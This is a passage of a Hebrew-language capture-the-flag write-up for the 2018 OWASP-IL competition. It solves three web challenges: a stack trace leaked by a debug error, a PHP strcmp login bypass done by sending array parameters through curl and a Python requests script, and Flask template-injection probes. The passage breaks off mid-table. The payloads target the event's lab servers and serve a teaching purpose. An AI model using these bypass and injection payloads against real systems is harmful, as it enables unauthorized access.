<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>נשתמש באחת השיטות
כדי לקרוא את </span><span lang=EN-US dir=LTR>flag.txt</span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span> ונקבל:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><b><span lang=EN-US dir=LTR>OWASP-IL{Im4g3Tr4g1ck}</span></b></p>
<b><span lang=EN-US style='font-size:11.0pt;line-height:107%;font-family:"Calibri",sans-serif'><br
clear=all style='page-break-before:always'>
</span></b>
<p class=MsoNormal><b><span lang=EN-US>&nbsp;</span></b></p>
<h2 dir=RTL style='text-align:right;direction:rtl;unicode-bidi:embed'><span
lang=HE style='font-family:"Times New Roman",serif'>אתגר 9 </span><span
lang=HE style='font-family:"Arial",sans-serif'>–</span><span lang=HE
style='font-family:"Times New Roman",serif'> </span><span lang=EN-US dir=LTR>TheBug</span><span
dir=RTL></span><span lang=HE style='font-family:"Times New Roman",serif'><span
dir=RTL></span> (רמת קושי בינונית, 350 נקודות)</span></h2>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הוראות האתגר:</span></p>
<p><span lang=en-IL>I have a bug in my app that will give away the flag,<br>
I hope you won't find it :\<br>
What you are waiting for go away and find it...</span></p>
<p><span lang=en-IL>URL: <span class=MsoHyperlink><b><a
href="http://challenges.owaspil.ctf.today:8083/">http://challenges.owaspil.ctf.today:8083/</a></b></span></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>פתרון:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>האתר מציג מחשבון
שמאפשר לבצע פעולות חשבוניות בסיסיות:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=483
height=298 id="Picture 27" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image028.png"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הפעולות מתורגמות
לבקשות </span><span lang=en-IL dir=LTR>GET</span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span>, למשל עבור
7+2:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span class=MsoHyperlink><span lang=en-IL><a
href="http://challenges.owaspil.ctf.today:8083/?calc=7%2B2"><span dir=LTR>http://challenges.owaspil.ctf.today:8083/?calc=7%2B2</span></a></span></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>אם ננסה לשחק עם
הפרמטרים, נקבל את התוצאה הבאה:</span></p>
<div align=right>
<table class=MsoTableGrid dir=ltr border=0 cellspacing=0 cellpadding=0 width="100%"
 style='border-collapse:collapse;border:none; margin: 0 auto; width:100%;'>
 <tr>
  <td width="50%" valign=top style='border:solid windowtext 1.0pt;
  border-right:none;padding:0cm 5.4pt 0cm 5.4pt'>
  <p class=MsoNormal dir=RTL style='margin-bottom:0cm;margin-bottom:.0001pt;
  text-align:right;line-height:normal;direction:rtl;unicode-bidi:embed'><span
  lang=EN-US dir=LTR>http://challenges.owaspil.ctf.today:8083/?calc=test</span></p>
  </td>
  <td width="50%" valign=top style='border:solid windowtext 1.0pt;
  padding:0cm 5.4pt 0cm 5.4pt'>
  <p class=MsoNormal dir=LTR style='margin-bottom:0cm;margin-bottom:.0001pt;
  line-height:normal'><span lang=EN-US>Unrecognized variable: 'test</span><span
  dir=RTL></span><span lang=HE dir=RTL style='font-family:"Arial",sans-serif'><span
  dir=RTL></span>'</span></p>
  </td>
 </tr>
 <tr>
  <td width="50%" valign=top style='border-top:none;border-left:
  solid windowtext 1.0pt;border-bottom:solid windowtext 1.0pt;border-right:
  none;padding:0cm 5.4pt 0cm 5.4pt'>
  <p class=MsoNormal dir=LTR style='margin-bottom:0cm;margin-bottom:.0001pt;
  line-height:normal'><span lang=EN-US>http://challenges.owaspil.ctf.today:8083/?calc</span><span
  dir=RTL></span><span lang=HE dir=RTL style='font-family:"Arial",sans-serif'><span
  dir=RTL></span>=</span></p>
  </td>
  <td width="50%" valign=top style='border:solid windowtext 1.0pt;
  border-top:none;padding:0cm 5.4pt 0cm 5.4pt'>
  <p class=MsoNormal dir=LTR style='margin-bottom:0cm;margin-bottom:.0001pt;
  line-height:normal'><span lang=EN-US>Unexpected end found</span></p>
  </td>
 </tr>
 <tr>
  <td width="50%" valign=top style='border-top:none;border-left:
  solid windowtext 1.0pt;border-bottom:solid windowtext 1.0pt;border-right:
  none;padding:0cm 5.4pt 0cm 5.4pt'>
  <p class=MsoNormal dir=LTR style='margin-bottom:0cm;margin-bottom:.0001pt;
  line-height:normal'><span lang=EN-US>http://challenges.owaspil.ctf.today:8083/?calc=1+1</span></p>
  </td>
  <td width="50%" valign=top style='border:solid windowtext 1.0pt;
  border-top:none;padding:0cm 5.4pt 0cm 5.4pt'>
  <p class=MsoNormal dir=LTR style='margin-bottom:0cm;margin-bottom:.0001pt;
  line-height:normal'><span lang=EN-US>Unexpected character found: '1' at index
  2</span></p>
  </td>
 </tr>
</table>
</div>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=EN-US dir=LTR>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>חיפוש בגוגל של
השגיאות הללו מגלה את </span><span class=MsoHyperlink><span lang=EN-US><a
href="https://stackoverflow.com/questions/41079379/evaluate-a-model-entered-by-user-as-python-function"><span
lang=HE style='font-family:"Arial",sans-serif'>הדף הזה</span></a></span></span><span
lang=HE style='font-family:"Arial",sans-serif'>, שבו אפשר למצוא משהו שנראה כמו
קוד המקור של הספרייה המשמשת לביצוע הפעולות החשבוניות.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>ממעבר זריז על הקוד,
קפצה לי לעין הפקודה הבאה (בעיקר בגלל ההדפסה):</span></p>

```python
raise Exception("Division by 0 kills baby whales (occured at index " +
                        str(div_index) + ")")
```

<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>זה נשמע כמו משהו
שכדאי לנסות.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>ואכן, התוצאה לא
אכזבה (בתקווה שאף בעל חיים לא נפגע במהלך הניסוי): </span></p>
<p class=MsoNormal dir=RTL  align=center style='text-align:center;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR><img border=0 width=602 height=195
id="Picture 28" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image029.png"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הפעם, אם ננסה
להקליק על הסמל של ה-</span><span lang=EN-US dir=LTR>Console</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span> על מנת להריץ קוד, נקבל את ההודעה הבאה:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=470
height=251 id="Picture 29" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image030.png"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>למזלנו, זה לא מפריע
כי הדגל נמצא ב-</span><span lang=EN-US dir=LTR>stack trace</span><span dir=RTL></span><span
lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span>:</span></p>
<p class=MsoNormal dir=RTL  align=center style='text-align:center;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR><img border=0 width=602 height=184
id="Picture 30" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image031.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הדגל:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><b><span lang=EN-US dir=LTR>OWASP-IL{L3ts_M4k3_Err0rs_Gr34t_Again}</span></b></p>
<b><span lang=EN-US style='font-size:11.0pt;line-height:107%;font-family:"Calibri",sans-serif'><br
clear=all style='page-break-before:always'>
</span></b>
<p class=MsoNormal><b><span lang=EN-US>&nbsp;</span></b></p>
<h2 dir=RTL style='text-align:right;direction:rtl;unicode-bidi:embed'><span
lang=HE style='font-family:"Times New Roman",serif'>אתגר 10 </span><span
lang=HE style='font-family:"Arial",sans-serif'>–</span><span lang=HE
style='font-family:"Times New Roman",serif'> </span><span lang=EN-US dir=LTR>TheCode</span><span
dir=RTL></span><span lang=HE style='font-family:"Times New Roman",serif'><span
dir=RTL></span> (רמת קושי בינונית, 400 נקודות)</span></h2>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הוראות האתגר:</span></p>
<p><span lang=en-IL>I can't believe I forgot the username and password!<br>
I have piece of the code maybe you can help me hack my own website?</span></p>
<p><span lang=en-IL>URL: <span class=MsoHyperlink><b><a
href="http://challenges.owaspil.ctf.today:8082/">http://challenges.owaspil.ctf.today:8082/</a></b></span></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>לאתגר צורף הקוד של </span><span
lang=EN-US dir=LTR>login.php</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span>.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>פתרון:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>החלק היחיד שמעניין
בקוד הוא הקטע הבא:</span></p>

```php
<?php
require_once('config.php');
 
function check_param($param) {
    return (isset($_POST[$param]) && !empty($_POST[$param]));
}
 
if (check_param('username') && strcmp($AUTH_USER, $_POST['username']) == 0 && check_param('md5') && strcmp($AUTH_MD5, $_POST['md5']) == 0) {
    $_SESSION['connected'] = 1;
    header('Location: /index.php');
    exit();
}
?>
```

<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>במבט ראשון, אנחנו
צריכים לספק שם משתמש וסיסמא (האתר מחשב </span><span lang=EN-US dir=LTR>MD5</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span> של הסיסמא בצד הלקוח וזה מה שנשלח בטופס הכניסה). קוד השרת משווה
את הקלט אל הערכים שהוגדרו מראש (הם שמורים ב-</span><span lang=EN-US dir=LTR>config.php</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span> ואין לנו גישה אליהם), ורק אם הם שווים ניתן להתחבר לאתר.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>התיעוד של </span><span
lang=EN-US dir=LTR>PHP</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> תמיד היה דוגמא
לתיעוד מוצלח בעיני, הוא כולל המון דוגמאות קוד רשמיות, וכל דף מסתיים עם הערות
מועילות של גולשים על דברים שכדאי לשים לב אליהם, מקרי קצה, דוגמאות קוד נוספות
ושאר ירקות. </span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>מכיוון שלא היה לי
כיוון אחר, נכנסתי ל</span><span class=MsoHyperlink><span lang=EN-US><a
href="http://php.net/manual/en/function.strcmp.php"><span lang=HE
style='font-family:"Arial",sans-serif'>תיעוד של </span><span dir=LTR>strcmp</span></a></span></span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span> ומצאתי את ההערה הבאה מועילה במיוחד:</span></p>

```
<?php
if (strcmp($_POST['password'], 'sekret') == 0) {
    echo "Welcome, authorized user!\n";
} else {
    echo "Go away, imposter.\n";
}
?>
$ curl -d password=sekret http://andersk.scripts.mit.edu/strcmp.php
Welcome, authorized user!
$ curl -d password=wrong http://andersk.scripts.mit.edu/strcmp.php
Go away, imposter.
$ curl -d password[]=wrong http://andersk.scripts.mit.edu/strcmp.php
Welcome, authorized user!
 
```

<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>נראה מתאים.</span></p>

```python
import requests
r = requests.post('http://challenges.owaspil.ctf.today:8082/login.php', data = {"username[]": "a", "md5[]": "a"})
print (r.text)
```

<p class=MsoNormal style='margin-bottom:0cm;margin-bottom:.0001pt'><span
lang=EN-US style='font-family:"Courier New"'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>והתוצאה:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><b><span lang=EN-US dir=LTR>OWASP-IL{PHP_1s_S0_B4d_Th4t_1t_Hurts}</span></b></p>
<b><span lang=EN-US style='font-size:11.0pt;line-height:107%;font-family:"Calibri",sans-serif'><br
clear=all style='page-break-before:always'>
</span></b>
<p class=MsoNormal><b><span lang=EN-US>&nbsp;</span></b></p>
<h2 dir=RTL style='text-align:right;direction:rtl;unicode-bidi:embed'><span
lang=HE style='font-family:"Times New Roman",serif'>אתגר 11 - </span><span
lang=EN-US dir=LTR>Recommendation Generator</span><span dir=RTL></span><span
lang=HE style='font-family:"Times New Roman",serif'><span dir=RTL></span> (רמת
קושי בינונית, 500 נקודות)</span></h2>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הוראות האתגר:</span></p>
<p><span lang=en-IL>Hi Guys, I need your help!<br>
Someone hacked my recommendation system and i can't found the security breach.<br>
Can you demonstrate the hacker's steps in order to take over the server and
send me the flag?</span></p>
<p><span lang=en-IL>URL: <span class=MsoHyperlink><b><a
href="http://challenges.owaspil.ctf.today:8087/">http://challenges.owaspil.ctf.today:8087/</a></b></span></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>פתרון:</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>כניסה לאתר מציגה את
הדף הבא:</span></p>
<p class=MsoNormal dir=RTL  align=center style='text-align:center;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR><img border=0 width=602 height=235
id="Picture 31" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image032.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הכנסה של פרטים
מייצרת המלצה אקראית:</span></p>
<p class=MsoNormal dir=RTL  align=center style='text-align:center;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR><img border=0 width=601 height=250
id="Picture 32" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image033.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=EN-US dir=LTR>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=EN-US dir=LTR>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=EN-US dir=LTR>&nbsp;</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הדבר הראשון ששמתי
לב אליו הוא שהאתר פגיע ל-</span><span lang=EN-US dir=LTR>XSS</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span>:</span></p>
<p class=MsoNormal dir=RTL  align=center style='text-align:center;direction:rtl;unicode-bidi:
embed'><span lang=en-IL dir=LTR><img border=0 width=602 height=184
id="Picture 33" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image034.jpg"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>אולם, הכיוון הזה לא
הוביל לשום מקום.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>המשכתי לחפש, ואחד מהדברים
שקפצו לי לעין היה השרת של האתר:</span></p>
<p class=MsoNormal align=center dir=RTL style='text-align:center;direction:
rtl;unicode-bidi:embed'><span lang=en-IL dir=LTR><img border=0 width=262
height=123 id="Picture 34" src="https://raw.githubusercontent.com/Dvd848/CTFs/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/images/image035.png"></span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>חיפשתי </span><span
lang=EN-US dir=LTR>gunicorn </span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span> ומצאתי ש-</span><span
lang=en-IL dir=LTR>The Gunicorn &quot;Green Unicorn&quot; is a Python Web
Server Gateway Interface HTTP server</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span>.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>אם כך, האתר כנראה
נכתב בפייתון, ורוב הסיכויים שהוא משתמש ב-</span><span lang=EN-US dir=LTR>Framework</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span> הפופולרי </span><span lang=EN-US dir=LTR>Flask</span><span
dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
dir=RTL></span>.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>מצאתי את ה</span><span
class=MsoHyperlink><span lang=EN-US><a
href="https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html"><span
lang=HE style='font-family:"Arial",sans-serif'>דף הזה</span></a></span></span><span
lang=HE style='font-family:"Arial",sans-serif'> אודות הזרקת קוד ל-</span><span
lang=EN-US dir=LTR>Flask Templates</span><span dir=RTL></span><span lang=HE
style='font-family:"Arial",sans-serif'><span dir=RTL></span>, והתחלתי לנסות.</span></p>
<p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
embed'><span lang=HE style='font-family:"Arial",sans-serif'>הטבלה הבאה מציגה את
הקלט והפלט של גישה לכתובת הבאה:</span></p>
<p class=MsoNormal><span lang=EN-US>http://challenges.owaspil.ctf.today:8087/get_recommendation?name=a&amp;recommender=<b>&lt;input&gt;</b></span></p>
<table class=MsoTableGrid border=0 cellspacing=0 cellpadding=0 width="100%"
 style='border-collapse:collapse;border:none;width:100%;' dir=ltr>
 <tr>
  <td width="50%" valign=top style='border:solid windowtext 1.0pt;
  padding:0cm 5.4pt 0cm 5.4pt'>
  <p class=MsoNormal style='margin-bottom:0cm;margin-bottom:.0001pt;line-height:
  normal'><span dir=LTR></span><b><span lang=EN-US><span dir=LTR></span>&lt;input&gt;</span></b></p>
  </td>
  <td width="50%" valign=top style='border:solid windowtext 1.0pt;
  border-left:none;padding:0cm 5.4pt 0cm 5.4pt'>
  <p class=MsoNormal style='margin-bottom:0cm;margin-bottom:.0001pt;line-height:
  normal'><span dir=LTR></span><b><span lang=EN-US><span dir=LTR></span>&lt;output&gt;</span></b></p>
  </td>
 </tr>
 <tr>
  <td width="50%" valign=top style='border:solid windowtext 1.0pt;
  border-top:none;padding:0cm 5.4pt 0cm 5.4pt'>
  <p class=MsoNormal style='margin-bottom:0cm;margin-bottom:.0001pt;line-height:
  normal'><span lang=EN-US>{{''.__class__}}</span></p>
  </td>
  <td width="50%" valign=top style='border-top:none;border-left:
  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;
  padding:0cm 5.4pt 0cm 5.4pt'>
  <p class=MsoNormal style='margin-bottom:0cm;margin-bottom:.0001pt;line-height:
  normal'><span dir=LTR></span><cite><span lang=en-IL style='font-family:"Calibri",sans-serif'><span
  dir=LTR></span>&lt;type 'str'&gt;</span></cite></p>
  </td>
 </tr>
 <tr>
  <td width="50%" valign=top style='border:solid windowtext 1.0pt;
  border-top:none;padding:0cm 5.4pt 0cm 5.4pt'>
  <p class=MsoNormal style='margin-bottom:0cm;margin-bottom:.0001pt;line-height:
  normal'><span lang=EN-US>{{''.__class__.mro()}}</span></p>
  </td>
  <td width="50%" valign=top style='border-top:none;border-left:
  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;

---

*Truncated at 1200 lines. Full text: <https://github.com/Dvd848/CTFs/blob/eaad41f2cb9679fd9be8ce6ab36018ec48008228/2018_OWASP-IL/README.md>*
